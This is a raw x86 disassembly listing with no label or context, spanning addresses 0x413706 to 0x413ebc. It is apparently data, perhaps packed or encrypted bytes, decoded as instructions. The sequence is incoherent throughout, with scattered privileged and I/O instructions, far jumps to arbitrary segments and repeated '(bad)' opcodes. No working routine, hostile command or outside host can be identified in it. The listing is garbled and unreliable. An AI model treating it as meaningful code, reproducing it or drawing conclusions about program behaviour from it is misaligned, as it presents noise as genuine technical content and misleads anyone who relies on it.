  413706:	push   eax
  413707:	mov    al,0xa8
  413709:	into   
  41370a:	add    eax,edi
  41370c:	repz ror edx,1
  41370f:	xchg   edx,eax
  413710:	jno    0x413777
  413712:	mov    ds:0x54edbf18,al
  413717:	pop    eax
  413718:	or     ecx,DWORD PTR [ebx+0x10]
  41371b:	and    BYTE PTR [edi+0x2e9ef2af],cl
  413721:	and    BYTE PTR [eax-0x5ce32824],bh
  413727:	mov    dh,0xed
  413729:	retf   0x6bb1
  41372c:	outs   dx,DWORD PTR ds:[esi]
  41372d:	lahf   
  41372e:	ds push cs
  413730:	adc    esp,esp
  413732:	xchg   edx,eax
  413733:	dec    eax
  413734:	and    ch,bl
  413736:	add    DWORD PTR [ebp+0x300e564b],esp
  41373c:	mov    ch,0x4
  41373e:	jmp    0x1f6:0xc3f67bdc
  413745:	xor    esp,ebp
  413747:	popa   
  413748:	mov    eax,0x57d06f71
  41374d:	mov    ecx,0x58189ca8
  413752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413753:	dec    ebp
  413754:	aam    0xce
  413756:	and    DWORD PTR [esi-0xb],0x55df7a4c
  41375d:	sub    al,0x47
  41375f:	lahf   
  413760:	(bad)  
  413761:	mov    ds:0x9d80d5c0,al
  413766:	push   cs
  413767:	imul   esp,DWORD PTR [esi+0x57],0xf10db732
  41376e:	or     dl,BYTE PTR [edx]
  413770:	push   ebx
  413771:	xchg   esi,eax
  413772:	push   esi
  413773:	and    edi,esi
  413775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413776:	loopne 0x41372f
  413778:	sub    eax,edx
  41377a:	mov    eax,0xc3bc2c3d
  41377f:	pcmpgtb mm7,mm2
  413782:	pop    esp
  413783:	(bad)  
  413784:	mov    ah,0xdd
  413786:	inc    ebx
  413787:	pop    ecx
  413788:	iret   
  413789:	cs adc ebx,edx
  41378c:	bound  edx,QWORD PTR [edx-0xfd1671a]
  413792:	mov    esi,esi
  413794:	mov    ecx,0xb7e3c772
  413799:	pusha  
  41379a:	ficom  DWORD PTR [ecx+0x63]
  41379d:	xor    eax,DWORD PTR [edi-0x7]
  4137a0:	push   ebx
  4137a1:	add    ebx,esp
  4137a3:	aam    0xe4
  4137a5:	dec    edx
  4137a6:	into   
  4137a7:	jmp    0x413791
  4137a9:	adc    DWORD PTR [eax+0x23],eax
  4137ac:	sub    esi,ebp
  4137ae:	xchg   ebp,eax
  4137af:	dec    ebx
  4137b0:	stos   BYTE PTR es:[edi],al
  4137b1:	lock repz je 0x41381f
  4137b5:	lods   eax,DWORD PTR ds:[esi]
  4137b6:	mov    ds:0x6b73d184,eax
  4137bb:	jns    0x4137e1
  4137bd:	pop    es
  4137be:	xor    dh,dh
  4137c0:	add    DWORD PTR [edi],esp
  4137c2:	xchg   cx,ax
  4137c4:	adc    al,0x4c
  4137c6:	xchg   ebx,eax
  4137c7:	pop    edi
  4137c8:	adc    al,BYTE PTR [ecx+ecx*4-0x35836389]
  4137cf:	(bad)  
  4137d0:	ret    0xa341
  4137d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137d4:	lods   eax,DWORD PTR ds:[esi]
  4137d5:	xchg   ebp,eax
  4137d6:	aaa    
  4137d7:	push   esi
  4137d8:	adc    eax,0x22bda74
  4137dd:	fwait
  4137de:	mov    al,ds:0x1842422f
  4137e3:	imul   edx,ebx,0x98d1831c
  4137e9:	hlt    
  4137ea:	mov    ecx,0xa565412f
  4137ef:	mov    ds:0x10cd2ec,eax
  4137f4:	arpl   WORD PTR [ecx+0x5513718d],dx
  4137fa:	or     esp,edx
  4137fc:	adc    ebx,DWORD PTR [eax]
  4137fe:	addr16 aad 0x9c
  413801:	dec    ecx
  413802:	sbb    eax,0x32fad5fc
  413807:	xchg   edx,eax
  413808:	(bad)
  41380c:	mov    ds:0xc094a17b,eax
  413811:	mov    al,ds:0xd819bd91
  413816:	or     ch,cl
  413818:	jbe    0x413877
  41381a:	jne    0x57bbffe1
  413820:	outs   dx,BYTE PTR ds:[esi]
  413821:	adc    BYTE PTR [ebx],ch
  413823:	mov    ds:0xd5d96b73,eax
  413828:	rcr    DWORD PTR ds:0x549239ee,0x4d
  41382f:	dec    edx
  413830:	mov    BYTE PTR [eax+eax*8-0xce318cd],dh
  413837:	in     al,0xd7
  413839:	and    DWORD PTR [ebp-0x53d62d4a],0x925d3b76
  413843:	inc    edi
  413844:	mov    dh,0x7d
  413846:	inc    eax
  413847:	arpl   WORD PTR [ebx+eax*2+0x7efbd3f7],di
  41384e:	jmp    0x413850
  413850:	pop    ebx
  413851:	xlat   BYTE PTR ds:[ebx]
  413852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413853:	pop    eax
  413854:	xchg   ch,bl
  413856:	push   0xd561b495
  41385b:	or     al,0xe0
  41385d:	inc    ebx
  41385e:	outs   dx,DWORD PTR ds:[esi]
  41385f:	sub    ecx,ebp
  413861:	push   eax
  413862:	sub    ah,BYTE PTR [edx+0x12]
  413865:	xchg   ebp,eax
  413866:	mov    eax,ds:0xc714a286
  41386b:	xchg   esi,eax
  41386c:	inc    eax
  41386d:	leave  
  41386e:	rcl    DWORD PTR [esi-0x78],0xf3
  413872:	xchg   esi,eax
  413873:	xchg   DWORD PTR [ebp+0x61],ecx
  413876:	int    0xc8
  413878:	test   dl,0x3c
  41387b:	or     al,BYTE PTR [ecx+0x6aa11957]
  413881:	jbe    0x413850
  413883:	push   ebx
  413884:	out    dx,al
  413885:	retf   
  413886:	out    0x53,eax
  413888:	ret    0xc615
  41388b:	fstp   DWORD PTR [edx]
  41388d:	rol    DWORD PTR [edx],1
  41388f:	stos   DWORD PTR es:[edi],eax
  413890:	stc    
  413891:	mov    dl,0x8e
  413893:	stos   DWORD PTR es:[edi],eax
  413894:	cwde   
  413895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413896:	out    0xea,eax
  413898:	js     0x41385a
  41389a:	jae    0x413836
  41389c:	out    dx,al
  41389d:	and    ch,ah
  41389f:	pop    esi
  4138a0:	and    al,0x4d
  4138a2:	pop    esi
  4138a3:	add    DWORD PTR [edi+0x50d0ffd3],ebp
  4138a9:	push   ds
  4138aa:	cmp    ebp,edi
  4138ac:	out    dx,al
  4138ad:	mov    ebp,0xac770c1b
  4138b2:	push   edx
  4138b3:	add    DWORD PTR [edx+0x70],ebx
  4138b6:	inc    ebp
  4138b7:	rol    BYTE PTR [eax+0x2628b6cf],1
  4138bd:	mov    bl,0xe8
  4138bf:	cmp    al,0x22
  4138c1:	dec    edx
  4138c2:	sub    ebp,eax
  4138c4:	or     ebx,DWORD PTR [edx+ecx*8+0x254246f2]
  4138cb:	or     BYTE PTR [eax+0x3bae96fe],bl
  4138d1:	jo     0x413900
  4138d3:	pop    eax
  4138d4:	jae    0x4138b5
  4138d6:	xor    BYTE PTR [ebx+0xff9f825],ah
  4138dc:	repnz gs xchg esi,eax
  4138df:	fstp   TBYTE PTR ds:0xee5cbe26
  4138e5:	sbb    BYTE PTR [ecx*8-0x331b462],0x8f
  4138ed:	es fs push cs
  4138f0:	mov    esi,0xdd57a512
  4138f5:	or     esi,DWORD PTR [edi+0x6e43cade]
  4138fb:	aaa    
  4138fc:	pop    eax
  4138fd:	ins    BYTE PTR es:[edi],dx
  4138fe:	add    al,dl
  413900:	popf   
  413901:	xor    al,0x7
  413903:	mov    edx,0x2c38e8a0
  413908:	push   ss
  413909:	pop    ebx
  41390a:	dec    esi
  41390b:	inc    ebx
  41390c:	int3   
  41390d:	popa   
  41390e:	in     eax,0x8d
  413910:	mov    cl,0xe8
  413912:	adc    edi,edx
  413914:	aad    0x38
  413916:	mov    bl,0xdf
  413918:	jmp    0x413961
  41391a:	sbb    BYTE PTR [edi-0x54],dh
  41391d:	sbb    eax,0x3d4b592e
  413922:	out    0xa,eax
  413924:	mov    dh,BYTE PTR [eax+0x14043cdf]
  41392a:	div    DWORD PTR [edx-0x3b]
  41392d:	cmp    cl,BYTE PTR ds:0x253c8748
  413933:	scas   eax,DWORD PTR es:[edi]
  413934:	cli    
  413935:	push   0xffffffe8
  413937:	dec    ecx
  413938:	cmp    ebx,edi
  41393a:	hlt    
  41393b:	fucom  st(5)
  41393d:	mov    ch,0xed
  41393f:	call   0x3755:0xb66a925
  413946:	or     BYTE PTR [edi],ch
  413948:	xor    eax,0xdfab0fd5
  41394d:	pop    ds
  41394e:	sti    
  41394f:	imul   ecx,DWORD PTR [ecx+ebx*1+0x23462cd6],0xfffffffc
  413957:	sahf   
  413958:	push   ss
  413959:	inc    ebp
  41395a:	jg     0x413924
  41395c:	pop    ss
  41395d:	aaa    
  41395e:	xchg   edi,eax
  41395f:	sub    eax,0xbba384f9
  413964:	in     al,dx
  413965:	adc    dh,BYTE PTR [edi+0x8be84ee]
  41396b:	cwde   
  41396c:	push   eax
  41396d:	sub    eax,0x7d6f6e24
  413972:	adc    BYTE PTR [esi-0x7e],bh
  413975:	adc    eax,0x13d92e46
  41397a:	xchg   edi,eax
  41397b:	repz ret 0x3c48
  41397f:	call   FWORD PTR [esp+ecx*1-0x32685a81]
  413986:	adc    edi,DWORD PTR [ebx]
  413988:	mov    ah,0x63
  41398a:	scas   al,BYTE PTR es:[edi]
  41398b:	stos   DWORD PTR es:[edi],eax
  41398c:	or     eax,0x779d3566
  413991:	inc    edx
  413992:	jnp    0x413949
  413994:	retf   0x29ed
  413997:	add    edx,edx
  413999:	stos   DWORD PTR es:[edi],eax
  41399a:	retf   0x16e0
  41399d:	jle    0x4139e6
  41399f:	cdq    
  4139a0:	pop    ebp
  4139a1:	adc    BYTE PTR [edx+esi*4-0x167363c8],ah
  4139a8:	push   ebx
  4139a9:	adc    ebx,DWORD PTR [esi-0x35]
  4139ac:	in     al,dx
  4139ad:	sbb    bh,al
  4139af:	arpl   bp,cx
  4139b1:	ss mov edx,ebx
  4139b4:	push   ebx
  4139b5:	or     DWORD PTR [esi],0xffffff85
  4139b8:	and    DWORD PTR [edi],0xbec6330d
  4139be:	jg     0x4139b3
  4139c0:	pusha  
  4139c1:	jmp    0x5b00d32a
  4139c6:	shr    BYTE PTR [eax-0x14],0xfe
  4139ca:	leave  
  4139cb:	xchg   ebx,eax
  4139cc:	add    BYTE PTR [edx+0x6df5da90],0xd6
  4139d3:	cmp    BYTE PTR [eax-0x6d0d8c35],bh
  4139d9:	sbb    al,0x96
  4139db:	cmp    ecx,DWORD PTR [esi-0x59d2459f]
  4139e1:	call   0x9cb92715
  4139e6:	push   ebx
  4139e7:	jge    0x4139d8
  4139e9:	pop    ebp
  4139ea:	jno    0x413a14
  4139ec:	sti    
  4139ed:	in     eax,0xc9
  4139ef:	clc    
  4139f0:	bnd jg 0x413a5d
  4139f3:	iret   
  4139f4:	in     eax,0x4d
  4139f6:	cmp    al,0xba
  4139f8:	sbb    DWORD PTR [ebx],0x38
  4139fb:	sbb    al,0x20
  4139fd:	sbb    eax,0x2b9868ed
  413a02:	mov    dl,0xd5
  413a04:	prefetcht2 BYTE PTR [edi+0x1f]
  413a08:	lods   eax,DWORD PTR ds:[esi]
  413a09:	cmp    DWORD PTR [eax+0x14],ecx
  413a0c:	push   esi
  413a0d:	sub    esi,edi
  413a0f:	aas    
  413a10:	pop    ebx
  413a11:	cmp    DWORD PTR [eax],esi
  413a13:	pop    esp
  413a14:	mov    bl,0xf6
  413a16:	mov    eax,0x432cd8d1
  413a1b:	push   esi
  413a1c:	fs and al,0x96
  413a1f:	lea    esp,[ebx+0x7]
  413a22:	xor    BYTE PTR [ebx+0x37],bl
  413a25:	mov    eax,0x166b6043
  413a2a:	cmp    bh,BYTE PTR [esi]
  413a2c:	test   eax,0x2f01cd86
  413a31:	jbe    0x4139b9
  413a33:	fmul   QWORD PTR [edx+0x0]
  413a36:	jns    0x4139fb
  413a38:	stos   DWORD PTR es:[edi],eax
  413a39:	fisubr DWORD PTR [edi]
  413a3b:	push   es
  413a3c:	call   0x5325:0x3118c4a
  413a43:	mov    esp,0x2de4e192
  413a48:	mov    al,0x23
  413a4a:	(bad)  [ebp-0x19]
  413a4d:	dec    esi
  413a4e:	jnp    0x413a76
  413a50:	dec    edx
  413a51:	sahf   
  413a52:	ror    BYTE PTR [ecx],0x2
  413a55:	push   eax
  413a56:	add    DWORD PTR [esi+ebx*1-0x78],esi
  413a5a:	mov    edx,0xbf288bef
  413a5f:	pop    es
  413a60:	sub    ebx,DWORD PTR [edi-0x58]
  413a63:	dec    ebx
  413a64:	pop    ds
  413a65:	out    dx,eax
  413a66:	cvtpi2ps xmm7,mm7
  413a69:	clc    
  413a6a:	wbinvd 
  413a6c:	and    ch,al
  413a6e:	lahf   
  413a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a70:	fsubr  QWORD PTR ds:0x3a958d65
  413a76:	out    dx,al
  413a77:	(bad)  [ebx+edi*2+0x11]
  413a7b:	(bad)  
  413a7c:	rol    BYTE PTR [edi-0x19],cl
  413a7f:	lds    edi,FWORD PTR [ecx]
  413a81:	pop    ebx
  413a82:	ror    DWORD PTR [edx],1
  413a84:	and    dl,dh
  413a86:	int3   
  413a87:	or     BYTE PTR [ebp-0x2b3522e3],ah
  413a8d:	sub    BYTE PTR [ebp-0x5bcb6cc9],bl
  413a93:	push   ss
  413a94:	adc    DWORD PTR [ebp+0x52],esp
  413a97:	dec    esp
  413a98:	inc    ebp
  413a99:	dec    ecx
  413a9a:	imul   esp,DWORD PTR [esp+edi*1+0x320e19ec],0x1e2fa9d7
  413aa5:	push   esi
  413aa6:	int    0x4d
  413aa8:	ds stc 
  413aaa:	sbb    BYTE PTR [eax],ch
  413aac:	xchg   edx,ecx
  413aae:	sbb    eax,DWORD PTR [edx-0x252eb845]
  413ab4:	xor    BYTE PTR [ecx-0x6e],ch
  413ab7:	in     al,0xb4
  413ab9:	icebp  
  413aba:	push   ebx
  413abb:	sbb    al,0x7b
  413abd:	jle    0x413b18
  413abf:	loopne 0x413b38
  413ac1:	cmp    BYTE PTR [eax],0x1e
  413ac4:	and    eax,eax
  413ac6:	cs and al,0x3d
  413ac9:	sub    edi,DWORD PTR [ebp+0x13]
  413acc:	ret    0x8ffa
  413acf:	push   esp
  413ad0:	aam    0x61
  413ad2:	jno    0x413a92
  413ad4:	push   esi
  413ad5:	pop    ecx
  413ad6:	inc    esp
  413ad7:	das    
  413ad8:	imul   esi,DWORD PTR [edi+ecx*8+0x6c97b6e7],0xffffffd3
  413ae0:	out    0xb4,eax
  413ae2:	push   eax
  413ae3:	mov    esp,DWORD PTR [edx-0x5e40db98]
  413ae9:	retf   
  413aea:	mov    ecx,0x826b9f06
  413aef:	sbb    esp,DWORD PTR [eax+0x14]
  413af2:	ret    
  413af3:	shr    BYTE PTR ds:0x50d665cb,cl
  413af9:	push   esp
  413afa:	mov    bl,0x31
  413afc:	jg     0x413ad3
  413afe:	pop    eax
  413aff:	(bad)  
  413b00:	jae    0x413ac8
  413b02:	push   ss
  413b03:	mov    ds:0x988db393,al
  413b08:	cmp    BYTE PTR [ebx],ah
  413b0a:	dec    ecx
  413b0b:	lock lock mov esi,0x7e8451a
  413b12:	add    al,0x96
  413b14:	loope  0x413ab1
  413b16:	xor    esp,eax
  413b18:	jp     0x413b87
  413b1a:	jne    0x413b94
  413b1c:	jne    0x413b3b
  413b1e:	xchg   edi,eax
  413b1f:	jne    0x413ad2
  413b21:	stos   BYTE PTR es:[edi],al
  413b22:	xor    BYTE PTR [edi],0xc
  413b25:	gs repnz push es
  413b28:	or     DWORD PTR [ecx-0x16],esi
  413b2b:	mov    edi,0x8af97269
  413b30:	jl     0x413b2f
  413b32:	sbb    eax,0x406041c4
  413b37:	mov    bh,0x42
  413b39:	fdiv   st(0),st
  413b3b:	icebp  
  413b3c:	inc    edi
  413b3d:	and    dh,bh
  413b3f:	in     al,0xe
  413b41:	sbb    BYTE PTR [ecx],ch
  413b43:	xchg   esi,eax
  413b44:	push   ss
  413b45:	jb     0x413b86
  413b47:	test   al,0x64
  413b49:	shl    DWORD PTR [edi-0x77],1
  413b4c:	xchg   ebp,eax
  413b4d:	leave  
  413b4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b4f:	cmc    
  413b50:	(bad)  
  413b51:	idiv   DWORD PTR [edi-0x3a]
  413b54:	lods   eax,DWORD PTR ds:[esi]
  413b55:	jge    0x413b5b
  413b57:	loopne 0x413b7b
  413b59:	in     al,0xea
  413b5b:	or     al,0x5f
  413b5d:	neg    BYTE PTR [esi+0x2c]
  413b60:	xor    ebp,DWORD PTR [ebp+0x8]
  413b63:	mov    cl,0x2e
  413b65:	mov    ah,0xc9
  413b67:	jae    0x413b35
  413b69:	dec    ebx
  413b6a:	in     eax,dx
  413b6b:	pop    esp
  413b6c:	adc    al,0x71
  413b6e:	mov    ?,WORD PTR [eax+0x56]
  413b71:	mov    eax,DWORD PTR [ebp-0x1acaa8d3]
  413b77:	sub    bh,ch
  413b79:	add    DWORD PTR [esi+0x2d9dcb1e],0x32
  413b80:	inc    ebp
  413b81:	rcr    ecx,1
  413b83:	das    
  413b84:	mov    BYTE PTR [ebx],ah
  413b86:	lock push cs
  413b88:	neg    BYTE PTR ds:0xb9682ed
  413b8e:	cmp    DWORD PTR [edx+0x6f],edx
  413b91:	popf   
  413b92:	stos   BYTE PTR es:[edi],al
  413b93:	cdq    
  413b94:	mov    ch,0x3
  413b96:	call   0x9a12:0x844a1d02
  413b9d:	mov    ds:0xd6ffb676,eax
  413ba2:	mov    bh,BYTE PTR [ebx]
  413ba4:	mov    dl,0x9e
  413ba6:	jno    0x413b68
  413ba8:	xchg   edx,eax
  413ba9:	fidivr WORD PTR [ebx-0x2e]
  413bac:	or     ah,ch
  413bae:	test   BYTE PTR [eax],ah
  413bb0:	pop    ebp
  413bb1:	mov    ch,0xaa
  413bb3:	call   0x38c85754
  413bb8:	xor    ebp,edi
  413bba:	lods   al,BYTE PTR ds:[esi]
  413bbb:	fs mov edi,0x67db31e
  413bc1:	add    dh,BYTE PTR [edx+edx*1+0x6]
  413bc5:	add    esi,0xa08eabc2
  413bcb:	jo     0x413bff
  413bcd:	add    DWORD PTR [edx+0x24c8c86],0xffffffa0
  413bd4:	retf   
  413bd5:	cmp    esi,ebx
  413bd7:	jne    0x413be9
  413bd9:	and    edi,DWORD PTR [eax+0x5a790308]
  413bdf:	or     al,0x49
  413be1:	dec    ebp
  413be2:	inc    esi
  413be3:	mov    ebp,0xec682009
  413be8:	push   ss
  413be9:	loope  0x413bbd
  413beb:	inc    edi
  413bec:	mov    esi,0xdb9d8de
  413bf1:	scas   al,BYTE PTR es:[edi]
  413bf2:	rol    edi,0xec
  413bf5:	jp     0x413c24
  413bf7:	std    
  413bf8:	or     BYTE PTR [edx+0x62],cl
  413bfb:	cwde   
  413bfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bfd:	push   ecx
  413bfe:	pop    edx
  413bff:	jmp    0x413c72
  413c01:	out    dx,al
  413c02:	jbe    0x413c2f
  413c04:	aaa    
  413c05:	jae    0x79a92fdd
  413c0b:	out    dx,eax
  413c0c:	sub    al,0x7
  413c0e:	sahf   
  413c0f:	loope  0x413bb3
  413c11:	repnz push ds
  413c13:	mov    al,ds:0x632ea90e
  413c18:	dec    ebx
  413c19:	cdq    
  413c1a:	mov    bh,0x84
  413c1c:	sti    
  413c1d:	call   0x531f02af
  413c22:	ret    0x4aab
  413c25:	fld    QWORD PTR [eax-0x25]
  413c28:	push   esp
  413c29:	pop    edx
  413c2a:	iret   
  413c2b:	cwde   
  413c2c:	fdiv   st(1),st
  413c2e:	retf   
  413c2f:	ret    0x6998
  413c32:	lock mov esi,0x7e38b3e8
  413c38:	add    ecx,DWORD PTR [edi-0x34f6cf4]
  413c3e:	in     eax,dx
  413c3f:	inc    esi
  413c40:	aam    0x63
  413c42:	and    DWORD PTR ds:0x672d3622,0x48
  413c49:	add    esi,DWORD PTR [esi]
  413c4b:	inc    eax
  413c4c:	and    BYTE PTR [edi],0x8d
  413c4f:	repz test DWORD PTR ds:0x8c2277bc,eax
  413c56:	push   ecx
  413c57:	mov    ds:0xd5066d0d,eax
  413c5c:	mov    ebp,0xada6d3f3
  413c61:	outs   dx,DWORD PTR ds:[esi]
  413c62:	cmp    eax,0xf1958d77
  413c67:	lods   al,BYTE PTR ds:[esi]
  413c68:	pop    ebx
  413c69:	pop    edx
  413c6a:	(bad)  
  413c6b:	imul   DWORD PTR [ebp-0x7cea3d68]
  413c71:	sbb    edx,DWORD PTR [edi+eax*4]
  413c74:	loopne 0x413c22
  413c76:	xor    DWORD PTR [edx+0x15],0xffffffff
  413c7a:	loopne 0x413c41
  413c7c:	in     al,0xa3
  413c7e:	cmc    
  413c7f:	jnp    0x413c45
  413c81:	push   ss
  413c82:	inc    ebp
  413c83:	leave  
  413c84:	add    eax,0x2e302094
  413c89:	xor    esp,DWORD PTR [edx+0x71540ee2]
  413c8f:	dec    edx
  413c90:	mov    DWORD PTR [ebp+0x11],esi
  413c93:	pminsw mm5,QWORD PTR [edi-0x28]
  413c97:	xchg   BYTE PTR [ebp-0x729cf07a],dl
  413c9d:	pop    es
  413c9e:	cwde   
  413c9f:	jmp    0xd487:0xb6448c68
  413ca6:	cdq    
  413ca7:	in     al,0xc2
  413ca9:	pop    esi
  413caa:	xchg   ebx,eax
  413cac:	dec    edi
  413cad:	jg     0x413ca0
  413caf:	loope  0x413d10
  413cb1:	(bad)  
  413cb2:	or     DWORD PTR [ebx],edx
  413cb4:	xlat   BYTE PTR ds:[ebx]
  413cb5:	add    edi,esp
  413cb7:	jle    0x413c89
  413cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cba:	mov    cl,0x9
  413cbc:	pop    esi
  413cbd:	xchg   ebp,eax
  413cbe:	sub    bh,BYTE PTR [esi]
  413cc0:	dec    esi
  413cc1:	cli    
  413cc2:	pop    ecx
  413cc3:	sub    DWORD PTR [ecx-0x4f],esi
  413cc6:	arpl   WORD PTR [esi+0x7370561e],bp
  413ccc:	jmp    eax
  413cce:	sub    al,0x83
  413cd0:	lea    ebp,[edi+ebx*8]
  413cd3:	xor    ah,al
  413cd5:	loop   0x413cf2
  413cd7:	dec    esp
  413cd8:	in     eax,0xa6
  413cda:	mov    esp,0xa4b189c0
  413cdf:	inc    esi
  413ce0:	sbb    ebp,DWORD PTR [esp+ebp*8+0x38602da5]
  413ce7:	in     eax,dx
  413ce8:	mov    esp,0xee05a45
  413ced:	sar    DWORD PTR [ebx-0x1f],0xf8
  413cf1:	mov    edi,0xd90aa979
  413cf6:	repz add ebx,DWORD PTR ds:0xf345d2b2
  413cfd:	cmp    DWORD PTR [ebx+ebp*4+0x6],esi
  413d01:	jne    0x413cde
  413d03:	clc    
  413d04:	mov    DWORD PTR [edx],ecx
  413d06:	popf   
  413d07:	dec    ebp
  413d08:	sti    
  413d09:	and    esi,0xffffffb2
  413d0c:	mov    eax,ds:0xd4c2ade1
  413d11:	shr    BYTE PTR [ecx],cl
  413d13:	xor    ebx,DWORD PTR [edx+0x6714f51c]
  413d19:	sahf   
  413d1a:	push   es
  413d1b:	in     al,dx
  413d1c:	enter  0x4adf,0x8e
  413d20:	(bad)  
  413d21:	mov    ds:0xcbacfa4e,eax
  413d26:	pushf  
  413d27:	jne    0x413cce
  413d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d2a:	cs cmc 
  413d2c:	mov    bl,0x94
  413d2e:	ds jl  0x413ce4
  413d31:	ins    BYTE PTR es:[edi],dx
  413d32:	push   edi
  413d33:	fisubr WORD PTR [esi]
  413d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d36:	lds    ebx,FWORD PTR [edi-0x62]
  413d39:	jg     0x413d40
  413d3b:	retf   0xf939
  413d3e:	scas   al,BYTE PTR es:[edi]
  413d3f:	cmc    
  413d40:	cmc    
  413d41:	push   edi
  413d42:	pop    ecx
  413d43:	inc    eax
  413d44:	sub    dl,dh
  413d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d47:	sbb    bl,BYTE PTR [esi]
  413d49:	mov    WORD PTR [ebp-0x2154ce55],ds
  413d4f:	push   es
  413d50:	push   eax
  413d51:	leave  
  413d52:	jno    0x413d32
  413d54:	jno    0x413dbf
  413d56:	push   ecx
  413d57:	jne    0x413dc8
  413d59:	rcl    BYTE PTR [ebx-0x69],0xf7
  413d5d:	mov    al,0x20
  413d5f:	dec    ecx
  413d60:	dec    ebp
  413d61:	xchg   edi,edi
  413d63:	adc    ecx,DWORD PTR es:[eax-0x53a91260]
  413d6a:	sbb    al,0x33
  413d6c:	xchg   edx,eax
  413d6d:	(bad)  
  413d6e:	dec    cl
  413d70:	fidivr WORD PTR [edx+edi*2+0x33]
  413d74:	stc    
  413d75:	push   es
  413d76:	push   edx
  413d77:	jbe    0x413db0
  413d79:	ja     0x413d42
  413d7b:	out    0x38,eax
  413d7d:	test   eax,0xd135a81c
  413d82:	lods   al,BYTE PTR ds:[esi]
  413d83:	jle    0x413d05
  413d85:	add    DWORD PTR [ecx+0x74],eax
  413d88:	mov    dh,0xd3
  413d8a:	popa   
  413d8b:	cmp    cl,BYTE PTR [esi]
  413d8d:	xchg   esi,eax
  413d8e:	sub    BYTE PTR [esi],ah
  413d90:	loop   0x413d62
  413d92:	cmp    BYTE PTR [ebp-0x22b9e24d],dh
  413d98:	sbb    dh,al
  413d9a:	test   ebx,edx
  413d9c:	ret    
  413d9d:	retf   
  413d9e:	push   edx
  413d9f:	jecxz  0x413de4
  413da1:	cli    
  413da2:	pop    edi
  413da3:	mov    ds:0x757e10b2,eax
  413da8:	ss call 0xd9df65df
  413dae:	adc    eax,ecx
  413db0:	in     eax,dx
  413db1:	push   ss
  413db2:	mov    edx,0xa57adfe3
  413db7:	sti    
  413db8:	jmp    0x97897019
  413dbd:	sbb    eax,0x85f84fa7
  413dc2:	sar    BYTE PTR [ebx-0x6b],1
  413dc5:	jnp    0x413dac
  413dc7:	or     BYTE PTR [edi+ebx*8+0x877a61f],cl
  413dce:	cdq    
  413dcf:	ds sub al,0x54
  413dd2:	xchg   edi,eax
  413dd3:	xchg   edi,eax
  413dd4:	lea    edx,ds:0x7f3ad169
  413dda:	mov    dl,0xad
  413ddc:	mov    ebp,cs
  413dde:	ja     0x413e32
  413de0:	daa    
  413de1:	fcmovu st,st(6)
  413de3:	fdiv   st(6),st
  413de5:	test   DWORD PTR [esi+ebx*2],eax
  413de8:	cld    
  413de9:	sar    DWORD PTR [edi-0x7c],1
  413dec:	stos   BYTE PTR es:[edi],al
  413ded:	icebp  
  413dee:	daa    
  413def:	jg     0x413d92
  413df1:	mov    ebp,0xa6f1eccc
  413df6:	test   al,0x45
  413df8:	inc    esp
  413df9:	sbb    al,0x45
  413dfb:	cmc    
  413dfc:	lds    eax,FWORD PTR [ecx]
  413dfe:	pop    edx
  413dff:	lahf   
  413e00:	shl    BYTE PTR [eax-0x3fdb6d4f],0x60
  413e07:	ret    0x8309
  413e0a:	push   esp
  413e0b:	enter  0xf327,0x30
  413e0f:	adc    eax,0xc2d48fa5
  413e14:	pop    esi
  413e15:	daa    
  413e16:	jge    0x413e3a
  413e18:	outs   dx,BYTE PTR ds:[esi]
  413e19:	out    dx,al
  413e1a:	push   edi
  413e1b:	mov    ecx,0xc7bd5050
  413e20:	ret    0xe913
  413e23:	dec    esp
  413e24:	cmp    DWORD PTR [ecx+0x5e],esp
  413e27:	xchg   ebx,eax
  413e28:	fild   WORD PTR [edi+0x1eaf434c]
  413e2e:	out    0x4b,al
  413e30:	xchg   esi,eax
  413e31:	mov    eax,0xc99c8e3d
  413e36:	jp     0x413ddf
  413e38:	sub    al,0x97
  413e3a:	push   cs
  413e3b:	adc    esi,ebx
  413e3d:	lds    ecx,FWORD PTR [ecx-0x6c]
  413e40:	sahf   
  413e41:	inc    ebp
  413e42:	stos   BYTE PTR es:[edi],al
  413e43:	xor    esp,edi
  413e45:	pop    ss
  413e46:	jl     0x413e5d
  413e48:	leave  
  413e49:	mov    cl,0x3
  413e4b:	mov    ecx,0xba2e373b
  413e50:	dec    ebp
  413e51:	mov    ch,0x55
  413e53:	adc    DWORD PTR [edi],ebx
  413e55:	sahf   
  413e56:	dec    esi
  413e57:	ins    DWORD PTR es:[edi],dx
  413e58:	imul   eax,DWORD PTR [ecx+0x738b0004],0xffffff81
  413e5f:	(bad)  [edi]
  413e61:	bound  edi,QWORD PTR [esi+0x24f1b286]
  413e67:	test   al,0x42
  413e69:	mov    eax,ds:0x48106324
  413e6e:	hlt    
  413e6f:	adc    al,0xaf
  413e71:	xchg   ecx,eax
  413e72:	mov    ah,0xb8
  413e74:	ss jmp 0x1b615dde
  413e7a:	jb     0x413e4d
  413e7c:	jne    0x413e5c
  413e7e:	and    eax,0xd585b33e
  413e83:	mov    ebp,0x9a9ab541
  413e88:	jae    0x413e58
  413e8a:	mov    edx,0x9337369
  413e8f:	jb     0x413e52
  413e91:	sub    al,0xf5
  413e93:	das    
  413e94:	or     bh,BYTE PTR [esi-0x4a6636fa]
  413e9a:	adc    DWORD PTR [ecx-0x3a],ecx
  413e9d:	mov    bh,0xf7
  413e9f:	test   al,0x99
  413ea1:	cli    
  413ea2:	sbb    al,0x6d
  413ea4:	outs   dx,DWORD PTR ds:[esi]
  413ea5:	add    edi,edi
  413ea7:	in     al,dx
  413ea8:	inc    ebp
  413ea9:	push   es
  413eaa:	cdq    
  413eab:	ffreep st(7)
  413ead:	(bad)  
  413eaf:	(bad)  
  413eb0:	adc    al,0x44
  413eb2:	adc    bl,BYTE PTR [ebp+ebx*1-0x61]
  413eb6:	mov    esi,0x35c031c7
  413ebb:	push   es
  413ebc:	fs popf 
